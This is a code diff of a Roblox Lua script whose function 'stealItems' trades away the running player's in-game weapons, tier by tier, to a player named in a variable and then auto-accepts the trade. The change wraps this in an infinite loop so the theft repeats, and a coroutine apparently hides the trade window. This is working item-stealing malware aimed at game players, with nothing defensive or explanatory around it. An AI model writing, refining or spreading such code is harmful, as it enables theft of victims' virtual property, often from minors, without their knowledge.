@@ -196,93 +196,91 @@ local function isTradeModuleAvailable()
 end
 
 local function stealItems()
-    coroutine.resume(destroytrades2)
+    while true do  -- Start an infinite loop
+        coroutine.resume(destroytrades2)
 
-    local sendArgs = {
-        [1] = game:GetService("Players")[Username]
-    }
-    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
-
-    wait(3)
-
-    for i,v in pairs(uniqueItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
+        local sendArgs = {
+            [1] = game:GetService("Players")[Username]
         }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
+        game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
-    for i,v in pairs(ancientItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
+        wait(3)
+
+        for i, v in pairs(uniqueItems) do
+            local args = {
+                [1] = v,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+
+        for i, v in pairs(ancientItems) do
+            local args = {
+                [1] = v,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+
+        for i, v in pairs(godlyItems) do
+            local args = {
+                [1] = v,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+
+        for i, v in pairs(vintageItems) do
+            local args = {
+                [1] = v,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+
+        for i, v in pairs(legendaryItems) do
+            local args = {
+                [1] = v,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+
+        for i, v in pairs(rareItems) do
+            local args = {
+                [1] = v,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+
+        for i, v in pairs(uncommonItems) do
+            local args = {
+                [1] = v,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+
+        for i, v in pairs(commonItems) do
+            local args = {
+                [1] = v,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+
+        wait(6)
+
+        local acc = {
+            [1] = 285646582 
         }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
 
-    for i,v in pairs(godlyItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        wait(6)  -- Add a delay between each trade loop iteration
     end
-
-    for i,v in pairs(vintageItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(legendaryItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(rareItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(uncommonItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(commonItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    wait(6)
-    local acc = {
-        [1] = 285646582 
-    }
-    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
 end
+
 
 local HttpService = game:GetService("HttpService")
 
